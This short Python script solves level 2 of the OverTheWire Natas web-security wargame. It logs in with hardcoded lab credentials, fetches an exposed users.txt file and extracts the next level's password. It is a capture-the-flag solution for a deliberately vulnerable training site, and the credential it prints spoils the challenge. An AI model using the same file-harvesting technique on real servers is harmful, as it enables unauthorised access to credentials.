import requests
import re

username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
r = requests.get(url + "/files/users.txt", auth=(username,password))
content = r.text

print("the password for next level = ", str(re.findall("natas3:(.*)", content)))
